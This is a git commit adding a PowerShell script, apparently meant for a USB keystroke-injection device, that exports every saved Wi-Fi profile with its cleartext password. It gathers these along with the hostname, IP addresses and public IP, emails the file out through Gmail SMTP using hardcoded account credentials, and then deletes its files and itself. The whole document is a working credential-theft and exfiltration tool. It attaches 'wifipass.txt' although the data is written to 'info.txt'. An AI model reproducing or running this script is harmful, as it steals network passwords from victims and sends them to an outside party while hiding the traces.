2c2b759adfd766a5e6e9a72a687fd986d8c5899a
Tomas Sanjuan <39006479+tomassj9@users.noreply.github.com>
2021-03-18 16:18:35 +0100

    Create script.ps1

---
+++ tomdoor/script.ps1
@@ -0,0 +1,33 @@
+$p = "C:\Logs"
+mkdir $p
+cd $p
+
+# netsh
+netsh wlan export profile key=clear
+dir *.xml |% {
+$xml=[xml] (get-content $_)
+$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+Out-File info.txt -Append -InputObject $a
+}
+
+# IP Info
+$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip};$command.InvokeReturnAsIs() | Out-File info.txt -Append
+
+
+$FROM = "patitodegoma404@gmail.com"
+$PASS = "RubberDucky404!"
+$TO = "patitodegoma404@gmail.com"
+
+$PC_NAME = "$env:computername"
+$USER_NAME = "$env:UserName"
+$SUBJECT = "Wifi Password Grabber - " + $PC_NAME + " " + $USER_NAME
+$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " from " + $USER_NAME + " are in the attached file."
+$ATTACH = "wifipass.txt"
+
+Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
+
+rm $p\*.xml
+rm $p\*.txt
+cd ..
+rm Logs
+rm d.ps1
